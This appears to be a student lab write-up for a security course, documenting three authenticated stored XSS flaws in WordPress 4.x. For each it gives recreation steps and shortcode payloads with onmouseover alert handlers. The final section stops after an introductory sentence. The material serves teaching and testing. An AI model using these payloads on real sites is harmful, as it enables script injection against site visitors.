# CodepathWeek7
Summary:Authenticated Stored Cross-Site Scripting (XSS)

    Vulnerability types: XSS
    Tested in version: 4.1
    Fixed in version: 4.2.3
<a href="https://imgflip.com/gif/2lwcgi"><img src="https://i.imgflip.com/2lwcgi.gif" title="made at imgflip.com"/></a>

Steps to recreate:
1. Gain access to an account 
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor to insert code similar to the following and post:

<a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">My link</a>
For my example the code is:
<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">Link</a>
When the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."


Summary:Authenticated Shortcode Tags Cross-Site Scripting (XSS)

    Vulnerability types: XSS
    Tested in version: 4.0
    Fixed in version: 4.3.1

<a href="https://imgflip.com/gif/2lwct8"><img src="https://i.imgflip.com/2lwct8.gif" title="made at imgflip.com"/></a>

Steps to recreate:
1. Gain access to an account 
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor to insert code similar to the following and post:

If an attacker puts in the following:

[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click me!</a>

WP processes this to become:

<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Click me</a>
Like the last vulnerability, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."

Summary:Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

    Vulnerability types: XSS
    Tested in version: 4.0
    Fixed in version: 4.7.3
 <a href="https://imgflip.com/gif/2lwd5d"><img src="https://i.imgflip.com/2lwd5d.gif" title="made at imgflip.com"/></a>

Steps to recreate:
1. Gain access to an account 
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor to insert code similar to the following and post-vulnerability through the use of an embed shortcode:

 [embed src='https://www.youtube.com/embed/12345\x3csvg <Event-attribute-with-JS-code-here>\x3e'][/embed]

which WP processes to:

<p>https://youtube.com/watch?v=12345<svg <Event-attribute-with-JS-code-here>></p>
Here we demonstrate the vulnerability through the use of an embed shortcode:

